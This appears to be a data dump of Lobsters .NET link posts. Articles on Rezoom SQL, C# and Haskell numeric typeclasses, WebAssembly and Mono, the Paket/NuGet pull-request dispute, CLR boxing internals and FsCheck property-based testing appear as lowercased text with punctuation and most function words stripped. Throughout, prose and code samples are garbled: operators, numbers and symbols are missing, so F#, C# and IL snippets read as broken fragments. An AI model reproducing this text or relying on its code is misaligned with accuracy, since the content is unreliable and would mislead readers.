fsharpoption make scenario work extra smoothly check query playground see kind sql write productivity static typing make schema change example replacing firstname lastname field single fullname field comforting know compiler point query need update typechecker also tightens feedback loop nt waste time tracking typo trivial sql mistake normally encounter runtime handful possible error informed compile time fix second currently different error type detected compile time mistyped table name incompatible data type selecting column included group clause flexible migration order working team since rezoomsql understands language know migration like alter table x add column alter table x add column z run order produce effect working team take advantage add table column need feature coding team member feature without decide one true migration order merge see detail integration rezoom use rezoomsql example code name implies designed work rezoom use rezoom take advantage automatic caching combine unit business logic share round trip database automatic batching rezoom build plan represent transaction may involve multiple sql command web api call highlatency data manipulation one plan called threetrip make query another called twotrip make query choose whether combine sequentially round trip database let sequential plan let x threetrip let twotrip return x concurrently round trip database first two query batch sent database include pending query threeplan twotrip let concurrent plan let x threetrip twotrip return x automatic caching statically typed query come useful info caching compilergenerated id boolean indicating whether could make sense cache side effect use rand newid etc bitmask table read bitmask table writes rezoom us cache info avoid unnecessarily requerying data execution plan ie within transaction mean different function call loaduserpermissions currentuserid query permission actually run use function together transaction unless course edit permission table course transaction case cached result automatically invalidated permission requeried next time requested let safely check invariant need method domain layer without fear causing mountain redundant query without effort writing caching layer get started get started using rzsql read tutorial get running minute money back
369,Lobsters,dotnet,"C#, F#, .NET programming",Interfaces and typeclasses: Number APIs in C# and Haskell,https://mzabani.wordpress.com/2017/06/22/interfaces-and-typeclasses-number-apis-in-c-and-haskell/,interface typeclasses number apis c haskell,haskell xmonad big difference create typeclass make type implement haskell instantiate note reader subtraction like,c sometimes sorely miss something like inumber interface method add subtract multiply others lack mean cumbersome write generic code number mean instead writing something like sum ienumerable number inumber write possible overload double sum ienumerable double number float sum ienumerable float number decimal sum ienumerable decimal number implementation body function exactly write multiple time anyway people work creating generic method operation need resorting runtime typechecking add b double return double double b else int return int int b terribly good solution however since compiletime guarantee type number mention performance cost runtime typechecking solution extended new type someone writes complex class represent complex number implementation add would open modification code could never packaged library sadly hard solve conundrum without changing base class library thing could hope people microsoft design numeric interface inumber others make wellknown primitive numeric type implement interface enter haskell haskell programming language playing last year except steep learning curve good thing say extremely expressive amusing see code build almost certainly work also extremely terse easily see window manager le line code xmonad code post haskell problem shown solved typeclasses think something similar interface since specify contract concrete type must obey big difference create typeclass make type implement haskell instantiate mean design numeric typeclasses haskell standard numeric type dataint datacomplex instantiate haskell create function named infix application need differentiate operator regular function one module numeric numeric namespace definition live import qualified prelude prelude base set type typeclasses function used common task class construct actually creates typeclass similar interface say concrete type instantiate typeclass must implement function called receiving two parameter type returning object type well class number zero specifies type int nt instance number add multiply function already exist haskell inside prelude use instance number preludeint b prelude b b prelude b zero define generic sum function sum number list following line say type must instance typeclass number receives list return better way write haskell important right sum number sum zero base case empty list sum zero sum x x x sum x separate first element list x remaining list x note reader haskell prelude already come num typeclass addition multiplication existing numeric type already implement syntax really short really typechecked also scratch surface haskell capable believe tiny scratch important notice c entirely possible make new type added existing type defining public static operator b new type specify generic type constraint allow u work numeric type reality numeric apis consequence fact make type implement interface combined fact parametric polymorphism allows restriction based subclassing interface implementation exception new struct class constraint hard think useful typeclasses ilist icollection implement ireadonlycollection anyways maybe want stringbuilder systemstring implement istring allowing generic code need convert one another many possibility let take little get pretty interesting subtraction c subtract timespan datetime get another datetime subtracting int int however yield another int encode information haskell way checked compiler allowing u write generic code able subtract one object another answer yes develop set typeclasses make sure arithmetic operation never overflow would really help u write banking software example allowing u add subtract enormous value without worrying two language extension called multiparamtypeclasses typefamilies language multiparamtypeclasses language typefamilies module numeric import qualified prelude import prelude int integer tointeger negate type function available without need prefixed prelude import datatime class subtractive type difference fancy way saying combination difference two type meant represent another type difference haskell type integer represents arbitrarily large integer like biginteger net java implementation exactly prelude case instance subtractive integer integer type difference integer integer integer prelude instance subtractive int int type difference int int integer say difference two ints integer matter small two ints difference always representable integer b tointeger tointeger b let enjoy little put date time type mix instance subtractive utctime nominaldifftime type difference utctime nominaldifftime utctime b addutctime negate b function work two type allow take list tuples return list difference two element tuple somegenericdifferencefunction subtractive difference somegenericdifferencefunction somegenericdifferencefunction b x b somegenericdifferencefunction x quick reminder function take element list prepends element list example still incomplete need instance subtractive integer int subtractive int integer api become practical left reader however meanwhile let try ghci terminal ghci ghci l numerichs numeric let list int int need specify type list literal could type implement num including int integer numeric let difs somegenericdifferencefunction list numeric difs numeric difs difs integer c great lot achieved haskell could achieved isubtractive tresult could make existing type implement could also create structs simply wrap existing type write implicit coercion rule making new type implement custom interface make lot thing possible able pas instance ienumerable wrappertype replacement ienumerable wrappedtype without explicit casting example also watch stay away builtin arithmetic operator since might longer obey relation type specified interface might want int int biginteger hope enjoyed reading hope c java mainstream language developer read give haskell shot really amazing language comment correction welcome like like loading
371,Lobsters,dotnet,"C#, F#, .NET programming",.NET and WebAssembly - Is this the future of the front-end?,https://www.hanselman.com/blog/NETAndWebAssemblyIsThisTheFutureOfTheFrontend.aspx,net webassembly future frontend,year ago erik meijer talking javascript iswas assembly language discussionargument still kept happening development edge http webassemblyorg podcast webassembly mozilla fellow david bryant check podcast image steve sanderson ndc presentation webassembly compile webassembly c c today think going hot space next month os project mono project two prototype using mono webassembly currently life life dotnetanywhere dna project mono david fowler already debugging working prototype visual studio code steve present concept ndc conference blazor hackthon recently produced interesting sample fullblown app possibility f compile javascript f fable project folk asked webassembly think webassembly sponsor jetbrains rider new crossplatform net ide hosting,year ago erik meijer talking javascript iswas assembly language turned interesting discussionargument people really nt buy still kept happening currently webassembly world marching forward supported chrome firefox development edge opera safari avalanche begun late pebble vote ambassador kosh today webassembly absolutely thing learn http webassemblyorg even podcast webassembly mozilla fellow david bryant really check podcast proud good image steve sanderson ndc presentation writing classic clientside javascript todo application except writing code c webassembly webassembly wasm lowlevel bytecode format inbrowser clientside scripting evolved javascript easily compile webassembly c c today language jumping include webassembly target every day since work open source net since net core crossplatform imminent release worth exploring webassembly fit net world project identified help bridge net world webassembly world think going hot space next month despite overarching name os project meant consume wasm binary file execute within net assembly clear nt compiling net language c vbnet f webassembly using webassembly piece resuable compiled code got existing wasm file really want call net interestingly project nt spin chakra javascript engine run wasm instead read bytecode convert net via systemreflectionemit interesting stuff one great thing happening larger net ecosystem one net today past net thing installed window generally feared today net basically every window machine net core run docker mac window dozen linux even raspberry pi mono another instance net allows run code dozen platform multiple instance net active development mono project two prototype using mono webassembly first one us traditional full static compilation mode mono compiled mono c runtime mono class library along user code webassembly code produce one large statically compiled application try fully statically compiled hello world full static compilation currently life totally statically compiled hello world mono app web assembly another prototype difference perspective second prototype compiles mono c runtime web assembly us mono il interpreter run managed code one smaller download come expense performance mixed mode execution prototype currently life got much mono running web assembly il code interpreted one wonderful thing computer science one way something often awesome way similar idea mono project second prototype steve sanderson took yet another instance net six year old open source dotnetanywhere dna project compiled web assembly dna interpreted net runtime written portable c take standard il cil common intermediate language run resourceconstrained device possible run full net runtime eg mono clever huh resourceconstrained device six year later little virtual machine could javascript vm browser already powered standard bytecode format called webassembly prove concept steve compiles dotnetanywhere wasm take combined standard programming model see web thing like angular knockoutjs ember except rather writing web application ui javascript write c net language middle razor basically html c inline page look like call backend c code run wasm client side within blazor app function weatherforecast forecast override protected async task initasync using var client new httpclient var json await clientgetstringasync absoluteurl apisampledataweatherforecasts forecast jsonutildeserialize weatherforecast json would allow net programmer use data model client server much like wellfactored javascript today well using net library might familiar comfortable insane thing see well framework might work much anyone would care far couldshould go david fowler already debugging working prototype visual studio code nt take word watch video steve present concept ndc conference blazor prototype number people excited blazor hackthon recently produced interesting sample including fullblown app possibility lot project compiling transpiling thing javascript could modified support webassembly take f compile javascript f fable project folk asked webassembly point clear everyone prototyping hacking enjoying think webassembly sponsor check jetbrains rider new crossplatform net ide edit refactor test debug aspnet net framework net core xamarin unity application learn download trial hosting
372,Lobsters,dotnet,"C#, F#, .NET programming",Hello WebAssembly | Mono,http://www.mono-project.com/news/2017/08/09/hello-webassembly/,hello webassembly mono,currently life life c hello world action,experimenting couple approach bring mono web using webassembly technology efficiently safely execute code web browser without limited javascript running code written c c inside browser big motivator major programming language plan target webassembly platform webassembly month desktop computer android introduction io become nearly universal done exploratory work identify need done run mono browser early experiment promising let talk mono support various execution mode range traditional fully justintime compiled fully statically compiled couple hybrid mode statically compiled jit statically compiled interpreter today two prototype running webassembly first one us traditional full static compilation mode mono compiled mono c runtime mono class library along user code webassembly code produce one large statically compiled application try fully statically compiled hello world full static compilation currently life second prototype compiles mono c runtime web assembly us mono il interpreter run managed code one smaller download come expense performance mixed mode execution prototype currently life merged mono master november see c hello world f code action open system type shape circle float square float float entrypoint let main argv let circle consolewriteline currently neither approach optimized size using full mono desktop profile size come significantly use custom profile based mobile profile remove many unnecessary feature interesting technical challenge solve webassembly space hard stack walk straightforward single threaded development experience another component interesting study clearly want cake eat desire high performance come full linking statically compiling everything webassembly quick iterative development clearly something like interpreter jit compiler browser cached version libmono core managed library desirable
373,Lobsters,dotnet,"C#, F#, .NET programming",.NET Standard 2.0 is final,https://github.com/dotnet/announcements/issues/24,net standard final,join github today sign reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign perform action time signed another tab window reload refresh session signed another tab window reload refresh session
374,Lobsters,dotnet,"C#, F#, .NET programming",Some words on #nugate,https://cockneycoder.wordpress.com/2017/08/02/some-words-on-nugate/,word nugate,infamous pr nugate paket pr yet community responds support cost guv paket follow protocol forking ecosystem like paket pr big enough net foundation formal issue community affair paket community part net community paket community f developer userbase paket user people use paket simply part net community microsoft open source timing two week old new m summing like,author becoming infamous pr thought idea document thought regarding motivation well thought reaction side since nugate tl dr tiny innocuous pr nuget gallery showed install nuget package using paket closed abruptly nuget team inadequate explanation apparently ignored despite large community feedback paket pr bit background first pr idea came looking new version nuget site look much nicer current one must say noticing tab view add given package solution using either nuget dotnet cli thought might good opportunity pretty cool get similar tab added paket since microsoft publicly gone pretty much allin whole os thing forked nuget gallery repo found relevant file one razor view added appropriate two line add new tab submitted pr github took minute total believed naively turned pr would get pretty quickly tab deliberately added back list deselected form word explicitly affect user saw aside word paket cli click tab see meant two line markup custom logic anything like content added minimal provide link paket site provide discussion paket might want try fact deliberately kept pr like avoid anyone nuget team thinking trolling nuget bashing paketoneupmanship simply wanted site acknowledge yes paket exists notinsignificant part community using let make little bit easier use additive change providing functionality cost existing feature set within relatively short space time got autoapproval msft bot since pr small followed approval someone redmond positive sign following day pr received following wellpublicised kafkaesque response wanted try understand motivation behind reply read key part could glean want focus nuget net core usage stats unspecified time future hope provide guidance around client usage stats point make sense aside official nuget client paket popular nugetapi compatible client talking ten user even hundred paket used thousand thousand developer project open closedsource used heavily within f userbase several feature greatly aid working within script also within c vbnet shop funnily enough bumped old colleague mine month ago work tierone investment bank london without knowing even involved paket project told alternative nuget client adopted massively helped second point also confused reply acknowledged indeed client let leave aside fact really one alternative client mentioned deserve offered guidance site yet instead point future date uncertain reconsider question need wait get guidance today overall forgive little sceptical read genuine commitment instead interpreted rather bare minimum response hopefully would appear complete go away nothing lastly greatest respect nuget team people best placed provide guidance using paket obvious paket team community responds waited day weekend replied explaining clearly politely thought project admins reconsider decision least justify reasoning genuinely understand rationale behind accepting almost immediately post seem recall within hour pr explicitly closed comment explanation closed pretty surprised plain rude could see immediately would massive owngoal nuget microsoft furthermore dealing pr way would foster perceived view rightly wrongly nuget team like paket avoid anything might possibly increase adoption sure enough issue clear view net community note paket community later comment nuget team earning negative feedback comment picked pr twitterland comment include one like good feedback microsoft time writing still official word nuget team elaborate issue handled way speculate point reasoning behind possible reason observed people past couple week along personal view support cost concern m extra support cost paket tab added website heard people make much sense would adding tab basic guidance install package using paket somehow mean microsoft support paket tab even explain paket even download current form pr realistically usable people already using paket design want anyone reject pr simply saw paket v nuget client issue paket already mentioned several place across microsoft online content implication presumably mean either paket already supported b supported case another reference affect short first site run microsoft reference paket told people privately feel paket insignificant usage compared nuget case simple costbenefit analysis tiny usage paket similar tiny risk support cost versus negative pr community relation microsoft reference third party tool many place across online content microsoft responsible bug paket would leftpad npm simply acknowledge npm existence azure documentation would microsoft able issue emergency fix thirdparty open source tool may associated github repository special treatment paket involved supporting microsoft term alongside customer asking support well working alongside microsoft delivering solution large customer large customer live critical issue asp net site hosted azure care whether issue caused microsoft product thirdparty package manager written f going call microsoft support anyway pretty sure microsoft going tell customer milliondollar annual spend azure go away customer us paket jet use paket supported microsoft issue sense microsoft would le exposed accepting pr guv people suggested action rogue individual nuget team think rule one right would immediately reopened case decision one developer need even reference individual closed pr try make personal one person one team paket could nuget team understand paket suffering fud kind disinformation sincerely hope case since team solely responsible defacto package manager net one would hope aware package manager follow protocol apparently followed best practice protocol submitting pr word first submit issue github wait reviewed processed power finally getting permission actually submit pr mea culpa wrongly assumed need approval submit twoline pr changed markup really especially bothered wasting minute pr get rejected spent time pr rejected know drill repos force issue raised every pr got even bigger problem thought forking ecosystem something heard past several time related previous issue might nuget team see paket product divisive within net threat existence therefore wish see grow would gross mistake anyone think paket simply offer alternative option net developer using nuget package would also like benefit feature paket offer nuget like paket perhaps worrying possibility simplest nuget team like paket product therefore wish see grow would hope case since would mean letting personal feeling adversely affect entire net community mention would mean future paket defacto package manager net actively working thwart sincerely hope case pr big enough also seen suggestion pr enough included guidance paket use etc etc possibly fair point except going get paket accepted nuget gallery basic form hope something pr current form would fine way appeal existing paket user pr could easily introduce detail time additionally stopped repo admins saying immediately unfortunately nearly two week pr raised still yet hear anything nuget team microsoft large response led fear microsoft simply hoping problem go away net foundation people rightly brought light fact turn nuget project actually owned directly microsoft net foundation case people asked net foundation take nothing official pr twitter least sort response although last one still almost week ago last minute edit see someone raised formal issue foundation address overall think people would love hear foundation say clarify role play project others visàvis internal microsoft team ownership moment entirely clear owns nuget gallery project final say thing like evidently issue discussed internally microsoft suggests ownership rest foundation great form response jon scott also love little bit information community affair one thing personally think fairly safe assume issue first appeared one person immediately said something like paket lot warpath really really frustrating let try make point explain paket community part net community prefer think simply paket community really way categorise developer based package manager use let think moment based web framework use ide use whether work finance health care someone enterprise developer working vb net also us paket someone love os us f v code us nuget someone user nuget paket define people something like negative effect risk fracturing entire net community also incredibly lazy honest insulting discount feedback individual simply saying oh part community take whatever say pinch salt please paket community f developer userbase go f paket paket written f work across c vb net f project full net net core various reason higher correlation paket f community c eg paket work better script f user likely comfortable using command line tool f user used working tool proscribed microsoft however pretty sure paket used many many c project f one word paket f completely separate concern conflate two might saying jsonnet written c therefore next time issue jsonnet go find mads torgesen let hear one please paket user much better way looking paket user simply people use paket simply part net community closed meeting paket user month entrance permitted topsecret handshake whatsapp channel message people say issue appeared github everyone flame microsoft people part community microsoft helped build year people outside net community community leader choose make know many people contributed discussion github twitter know might know f paket uk german developer community others know simply well known net community enterprise developer mvp clue use paket probably mixture interested outcome speaks wider issue actually wish could heard vocal people trying drive socalled net renaissance recently microsoft open source something believe incredibly important understand issue speaks much one pr let recap briefly twoline pr add technically harmless piece markup upvoted relatively broad spectrum user time next popular item nuget gallery repo closed controversial circumstance timing nearly two week passed still resolution issue much le clue issue even discussed internally m net foundation people suggested microsoft simply waiting issue die time simply lock issue hopeful case still discussed internally case would suspect much time probably case serious discussion happening nonetheless really help probably slamdunk pr taken two week get resolution bode well old new m original tweet closure pr somewhat harsh since accused m believer os unless msowned code believe m still way go big stride made area slowly surely thing moving forward lot project m accepting pr external contributor fair treat redmond brush nonetheless issue like come along fear old microsoft come rushing back idea open source simply call readonly open source redmond staff redmond staff know best net developer waiting patiently microsoft come back u response get microsoft moped super tanker thing like probably take time decide upon although must admit expect writing two week creating pr microsoft crucial receive clear honest reply believe paket evil project something destined divide net ecosystem say new net sdk runtime entirely backwards compatible highenough quality simply like product want shown nuget gallery page say respect least paket team user know stand plus clear understanding expect microsoft work community tool written overlap existing tool m future owned microsoft alternatively think paket positive addition suite net tool promotes healthy net ecosystem run community front pack say allow flourish hold back pay problem lip service simply suggesting public supportive whilst privately passively sitting actively blocking anything might see paket grow delaying another incident like occurring somewhere line summing started genuinely innocent attempt simply improve nuget gallery site make life tiny bit easier paket user turned question microsoft commitment open source relationship community microsoft net developer part community say direction net community giving message loud clear alternatively net developer part customer base customer giving message loud clear great opportunity respond positive manner silence cynic say microsoft committed open source also zerosum game paket growing negative nuget bad thing net general looking forward hearing back like like loading related
375,Lobsters,dotnet,"C#, F#, .NET programming",A look at the internals of ‘boxing’ in the CLR,http://www.mattwarren.org/2017/08/02/A-look-at-the-internals-of-boxing-in-the-CLR/,look internals boxing clr,look internals boxing clr fundamental part net without knowing actually work note ben adam clr internals boxing clr specification clr specification creating boxed type first check dealing value type cpuspecific codegeneration runtime jit code jitunbox jitunboxhelper wired compiler impimportblockcode put onto stack unboxany unbox unboxing create copy value unboxing stub creation full output available unboxing stub needed object tostring key diagram stack heap useful article valuetypes derive object referencetype still valuetypes reading github issue similarrelated article stack overflow question,look internals boxing clr aug word fundamental part net often happen without knowing actually work net runtime make boxing possible note post discussing detect boxing affect performance remove speak ben adam talking work aside like reading clr internals may find post interesting boxing clr specification firstly worth pointing boxing mandated clr specification runtime provide mean key thing clr need take care explore rest post creating boxed type first thing runtime need create corresponding reference type boxed type struct load see action right beginning method table creation first check dealing value type behaves accordingly boxed type struct created front dll imported ready used boxing happens program execution comment linked code pretty interesting reveals lowlevel detail runtime deal check see class valuetype nt want mark systemenum valuetype accomplish check take advantage fact systemvaluetype systemenum loaded one immediately order parent methodtable systemvaluetype systemenum methodtable unset must building systemenum nt mark valuetype cpuspecific codegeneration see happens program execution let start simple c program code creates custom struct value type boxed unboxed public struct mystruct public int value var mystruct new mystruct boxing var boxed object mystruct unboxing var unboxed mystruct boxed get turned following il code see box unboxany il instruction ldlocas mystruct initobj testnamespacemystruct box testnamespacemystruct unboxany testnamespacemystruct runtime jit code jit il op code well normal case wire inlines optimised handwritten assembly code version jit helper method provided runtime link take relevant line code coreclr source interesting enough jit helper method get special treatment object string array allocation go show performance sensitive boxing comparison one helper method unboxing called jitunbox fall back jitunboxhelper uncommon case wired corinfohelpunbox jitunbox jit also inline helper call common case save cost method call see compiler impimportblockcode note unbox helper fetch referencepointer boxed data put onto stack saw c compiler unboxing us unboxany opcode unbox one see unboxing create copy value information unboxing stub creation well boxing unboxing struct runtime also need help time type remains boxed see let extend mystruct override tostring method display current value public struct mystruct public int value public override string tostring return value valuetostring look method table runtime creates boxed version mystruct remember value type method table see something strange going note entry mystruct tostring one labelled unboxing stub method table summary mystruct number static field number instance field number static obj ref field number static boxed field number declared field number declared method number declared nonabstract method vtable interface dupe mystruct total duplicate slot sd mt methoditerator created mystruct testnamespacemystruct slot mystruct tostring slot unboxing stub slot systemvaluetype equal slot slot systemvaluetype gethashcode slot slot systemobject finalize slot slot mystruct tostring slot vtable end full output available unboxing stub needed call tostring boxed version mystruct call overridden method declared within mystruct want object tostring version mystruct tostring expects able access field within struct value case make possible runtimejit adjust pointer mystruct tostring called shown diagram mystruct object header methodtable mystruct mystruct boxed object pointer object header methodtable mystruct mystruct boxed adjusted pointer key diagram original struct stack struct boxed object life heap adjustment made pointer mystruct tostring work want information net object internals see useful article see action code linked note stub consists assembly instruction heavyweight method call cpuspecific version runtimejit trick help maintain illusion struct behave like class even though underthehood different see eric lipperts answer valuetypes derive object referencetype still valuetypes bit hopefully post given idea happens underthehood boxing take place reading got far might find link interesting github issue similarrelated article stack overflow question
376,Lobsters,dotnet,"C#, F#, .NET programming",An introduction to property-based testing,https://fsharpforfunandprofit.com/posts/property-based-testing/,introduction propertybased testing,f advent calendar english slide video part post cousin might heard writing minimal code make test pas transformation priority beating malicious programmer property based testing refactoring common code reviewing done far addition wikipedia specification property used sort specification specification example introducing quickcheck fscheck using fscheck test addition property using fscheck find unsatified property return malicious edfh understanding fscheck generator understanding fscheck generating sort type automatically understanding fscheck shrinking configuring fscheck changing number test configuring fscheck verbose mode logging adding precondition naming convention property combining multiple property combining propertybased test examplebased test using fscheck nunit summary come property apply code create generator shrinkers modelbased testing available github want written follow post choosing property propertybased testing slide video appendix installing troubleshooting fscheck currently appropriate binding redirects comment comment powered disqus blog comment powered,post part f advent calendar english project check great post special thanks sergey tihon organizing update talk propertybased testing based post slide video part post discus choose property propertybased testing start discussion hope never coworker need function add two number together would mind implementing short time later coworker finished implementing add function great written unit test coworker want test well roll eye ok short time later coworker wrote test look given expect output coworker call done well one test know nt fail input coworker ok let another one short time later coworker wrote another awesome test given expect output yes still testing special case know nt fail input nt thought coworker want even test mutter slavedriver breath walk away seriously imaginary complaint validity many test enough imagine rather developer test engineer responsible testing function implemented correctly unfortunately implementation written burnedout always lazy often malicious programmer call enterprise developer hell edfh cousin might heard practising testdrivendevelopment enterprisestyle mean write test edfh implement code pass test start test like using vanilla nunit style test let add expect let result add assertareequal result edfh implement add function like let add x else test pass complain edfh say tdd properly writing minimal code make test pas fair enough write another test test let add expect let result add assertareequal result edfh change implementation add function let add x else else complain edfh point approach actually best practice apparently called transformation priority point start thinking edfh malicious backandforth could go forever beating malicious programmer question kind test could write malicious programmer could create incorrect implementation even wanted well could start much larger list known result mix bit test let add two number expect get sum x expected let actual add x assertareequal expected actual edfh tireless update implementation include case well much better approach generate random number use input malicious programmer could possibly know advance let rand systemrandom let randint randnext test let add two random number expect sum let x randint let randint let expected x let actual add x assertareequal expected actual test look like edfh forced implement add function correctly one final improvement edfh might get lucky picked number work chance repeat random number test number time say time test let add two random number time expect sum let x randint let randint let expected x let actual add x assertareequal expected actual done property based testing one problem order test add function making use function word using one implementation test another case acceptable see use following post general bad idea test duplicate code testing waste time effort two implementation build keep date test using test answer create test focus property function property thing true correct implementation think property add function one way getting started think add differs similar function example difference add subtract well subtract order parameter make difference add good property start depend addition eliminate whole class incorrect implementation test let add two number result depend parameter order let x randint let randint let add x let add x reversed params assertareequal good start stop edfh edfh could still implement add using x test would pas difference add multiply addition really mean could start testing something like say x x x let add x x let x assertareequal assuming existence multiplication define property depends add one useful approach see happens function repeated add add result lead idea two add one add test test let adding twice adding let x randint let randint let x add add let x add assertareequal great add work perfectly test multiply however note edfh could still implement add using x test would pas luckily test well combination test narrow one correct implementation surely submitting test suite find edfh written implementation pass test look let add x malicious implementation aarrghh happened approach go wrong well forgot force implementation actually use random number generating need ensure implementation indeed something parameter passed going check result somehow connected input specific way trivial property add know answer without reimplementing version yes happens add zero number always get number back test let adding zero nothing let x randint let x add let x assertareequal set property used test implementation add force edfh create correct implementation refactoring common code quite bit duplicated code three test refactoring first write function called propertycheck work generating pair random ints propertycheck also need parameter property function take two ints return bool let propertycheck property property type int int bool let x randint let randint let result property x assertistrue result place redefine one test pulling property separate function like let commutativeproperty x let add x let add x reversed params test let add two number result depend parameter order propertycheck commutativeproperty also thing two property refactoring complete code look like let rand systemrandom let randint randnext let add x x correct implementation let propertycheck property property type int int bool let x randint let randint let result property x assertistrue result let commutativeproperty x let add x let add x reversed params test let add two number result depend parameter order propertycheck commutativeproperty let x let x add add let x add test let adding twice adding propertycheck let identityproperty x let x add x test let adding zero nothing propertycheck identityproperty reviewing done far defined set property implementation add satisfy parameter order matter property add twice add adding zero nothing property nice property work input special magic number importantly show u core essence addition fact take approach logical conclusion actually define addition anything property exactly mathematician look addition wikipedia see defined entirely term commutativity associativity identity note experiment missed defining instead created weaker property see later edfh indeed write malicious implementation satisfies property associativity better ala hard get property perfect first attempt even using three property came got much higher confidence implementation correct fact learned something understood requirement deeper way specification property collection property like considered specification historically unit test well functional test used sort specification well approach specification using property instead test data alternative think often shorter le ambiguous might thinking mathematical kind function specified way future post see approach used test web service database course every business requirement expressed property like must neglect social component software development specification example domain driven design play valuable role working nontechnical customer also might thinking designing property lot work right hardest part followup post present tip coming property might reduce effort somewhat even extra effort involved upfront technical term activity called way overall time saved automated test unambigous specification pay upfront cost later fact argument used promote benefit unit testing equally well applied propertybased testing tdd fan tell time come propertybased test might looking big picture introducing quickcheck fscheck implemented property checking system quite problem work integer function would nice could use approach function string parameter fact type parameter including one defined work two parameter function ignore one identity property would nice could use approach function number parameter counterexample property know helpful test fail logging random number generated way set seed mean debug reproduce error easily configurable example easily change number loop something else would nice framework u thankfully library originally developed haskell koen claessen john hughes ported many language version quickcheck used f c excellent library created kurt schelfthout although based haskell quickcheck nice additional feature including integration test framework nunit xunit look fscheck would thing homemade propertytesting system using fscheck test addition property first need install fscheck load dll fscheck bit finicky see bottom page instruction troubleshooting top script file look something like systemiodirectorysetcurrentdirectory sourcedirectory use older version r fscheckdll r nunitframeworkdll open system open fscheck open nunitframework fscheck loaded use checkquick pas function say function function parameter return boolean let add x x correct implementation let commutativeproperty x let add x let add x reversed params check property interactively checkquick commutativeproperty let x let x add add let x add check property interactively checkquick let identityproperty x let x add x check property interactively checkquick identityproperty check one property interactively say checkquick commutativeproperty see message using fscheck find unsatified property see happens malicious implementation add code edfh implement add multiplication implementation satisfy commutative property let add x x malicious implementation let x let x add add let x add check property interactively checkquick result fscheck falsifiable test shrink stdgen mean using input result false easily see return malicious edfh using random testing made harder malicious implementor change tactic edfh note still using magic number namely decides create implementation exploit use correct implementation low input value incorrect implementation high input value let add x x x correct low value else x incorrect high value oh retest property pas teach u use magic number test alternative well steal mathematician create associative property test let associativeproperty x z let add x add z x z let add add x z x z check property interactively checkquick associativeproperty aha get falsification falsifiable test shrink stdgen mean using note fscheck found input break property found lowest example know input pas going one higher fails nice understanding fscheck generator used fscheck real pause look work first thing fscheck generate random input called type associated generator example generate list sample data use generator along two parameter number element list precise meaning depends type generated context example thing used maximum value int length list depth tree etc code generates ints get generator ints let intgenerator arbgenerate int generate three ints maximum size gensample intgenerator eg generate three ints maximum size gensample intgenerator eg generate three ints maximum size gensample intgenerator eg example ints generated uniformly clustered around zero see little code see value clustered around center point intgenerator gensample seqgroupby id seqmap fun k v k seqlength v seqsortby fun k v k seqtolist result something like see value center generated time generated time outlying value rare generated time repeat larger sample one generates element range intgenerator gensample seqgroupby id seqmap fun k v k seqlength v seqsortby fun k v k seqtolist plenty generator function available well gensample documentation understanding fscheck generating sort type automatically great generator logic automatically generate compound value well example generator tuple three ints let tuplegenerator arbgenerate int int int generate tuples maximum size gensample tuplegenerator result generate tuples maximum size gensample tuplegenerator result generate tuples maximum size gensample tuplegenerator result generator base type option list generator follow generator int option let intoptiongenerator arbgenerate int option generate int option maximum size gensample intoptiongenerator result null generator int list let intlistgenerator arbgenerate int list generate int list maximum size gensample intlistgenerator result course generate random string let stringgenerator arbgenerate string generate string maximum size gensample stringgenerator result generate string maximum size gensample stringgenerator result eix u r best thing generator work userdefined type type color red green int blue bool let colorgenerator arbgenerate color generate color maximum size gensample colorgenerator result green red red red blue true green blue false red blue true green one generates userdefined record type containing another userdefined type type point x int int color color let pointgenerator arbgenerate point generate point maximum size gensample pointgenerator result x color green x color green x color red x color red x color red etc way finegrained control type generated wait another post understanding fscheck shrinking creating minimum counterexample one cool thing quickcheckstyle testing two part process fscheck us first generates sequence random input starting small getting bigger phase described input cause property fail start first parameter find smaller number exact process shrinking varies depending type override say number get smaller sensible way example say silly property let x x generated random number found property fails want try smaller number arbshrink generate sequence ints smaller one tried property turn property fails false start shrinking arbshrink seqtolist element list test property find another failure true true true false shrink property failed shrink using starting point arbshrink seqtolist true true true true false shrink property failed shrink using starting point arbshrink seqtolist smallest failure shrink property failed shrink using starting point arbshrink seqtolist smallest failure point shrinking work smaller value found case fscheck report falsifies property shrink needed generator fscheck generate shrink sequence almost type arbshrink seqtolist arbshrink abcd seqtolist bcd acd abd abc abca abcb abcc abad abbd aacd arbshrink seqtolist generator way customize shrinking work needed configuring fscheck changing number test mentioned silly property see fscheck silly property test let x x checkquick result ok passed test oh dear fscheck find counterexample point try thing first try increasing number test changing default configuration field called maxtest set default increase finally use specific config need use checkone config property rather checkquick property let config configquick maxtest checkone config result ok passed test oops fscheck find counterexample test either try test let config configquick maxtest checkone config result falsifiable test shrink stdgen ok finally got work take many test answer lie configuration setting startsize endsize remember generator start small number gradually increase controlled startsize endsize setting default startsize endsize end test parameter generator saw even size number generated extreme case mean number greater unlikely generated change endsize something larger see happens let config configquick endsize checkone config result falsifiable test shrink stdgen like test needed rather test configuring fscheck verbose mode logging mentioned one benefit fscheck homegrown solution logging reproducibility look tweak malicious implementation boundary see fscheck detects boundary via logging let add x x x correct low value else x incorrect high value let associativeproperty x z let add x add z x z let add add x z x z check property interactively checkquick associativeproperty result falsifiable test shrink stdgen fscheck found exact boundary point quite quickly first simplest way see fscheck use mode use checkverbose rather checkquick check property interactively checkquick associativeproperty tracinglogging checkverbose associativeproperty see output like shown added comment explain various element test param param param associativeproperty true keep going test associativeproperty true keep going test associativeproperty true keep going test associativeproperty true keep going etc test associativeproperty false start shrinking etc shrink associativeproperty false keep shrinking shrink associativeproperty false keep shrinking etc shrink associativeproperty false keep shrinking shrink associativeproperty false keep shrinking next shrink fails falsifiable test shrink stdgen display take lot space make compact yes control test shrink displayed writing custom function telling fscheck use via config structure function generic list parameter represented list unknown length obj list since know testing three parameter property hardcode threeelement list parameter print one line configuration also slot called replay normally none mean run different set replay seed test replayed exactly way seed look like stdgen someint someint printed run want preserve run need paste seed config use specific config need use checkone config property rather checkquick property code default tracing function changed replay seed set explicitly create function displaying test let printtest testnum x z sprintf testnum x z create function displaying shrink let printshrink x z sprintf shrink x z create new fscheck configuration let config configquick replay randomstdgen every printtest everyshrink printshrink check given property new configuration checkone config associativeproperty output much compact look like etc start shrinking first parameter shrink shrink shrink shrink start shrinking second parameter shrink shrink shrink start shrinking third parameter shrink shrink shrink falsifiable test shrink stdgen go quite easy customize fscheck logging need look shrinking done detail last set input false shrinking started last set input false shrinking started associativeproperty false shrink list possible shrink starting arbshrink seqtolist result loop list stopping first element cause property fail find next test fails shrinking x parameter let x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer first element caused failure part input start shrink find next test fails shrinking x parameter let 